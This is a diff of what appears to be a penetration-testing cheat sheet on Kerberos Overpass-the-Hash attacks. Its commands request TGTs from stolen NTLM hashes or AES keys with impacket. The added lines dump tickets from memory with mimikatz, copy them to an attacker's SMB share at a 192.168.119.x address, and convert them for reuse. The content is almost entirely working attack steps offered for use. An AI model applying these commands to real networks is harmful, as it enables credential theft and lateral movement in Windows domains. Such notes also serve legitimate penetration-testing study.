@@ -274,13 +274,20 @@ PS> .\PsExec.exe \\[computer] cmd.exe  # use TGT to perform code exec against
 
 OPTH via. KALI
 ```bash
-# Request the TGT with hash
+# [OPTION 1 TICKET RETRIEVAL] Request the TGT with hash
 $ python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
 # Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
 $ python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
 # Request the TGT with password
 $ python getTGT.py <domain_name>/<user_name>:[password]
 # If not provided, password is asked
+
+# [OPTION 2 TICKET RETRIEVAL] export tickets -> copy to Kali
+mimikatz> sekurlsa::tickets /export                             
+cmd> copy [ticket.kirbi] \\192.168.119.XXX\share\[ticket.kirbi]
+# use ticket_converter.py to convert .kirbi to .ccache
+# https://github.com/Zer1t0/ticket_converter
+$ python ticket_converter.py ticket.kirbi ticket.ccache
 
 # Set the TGT for impacket use
 $ export KRB5CCNAME=<TGT_ccache_file>
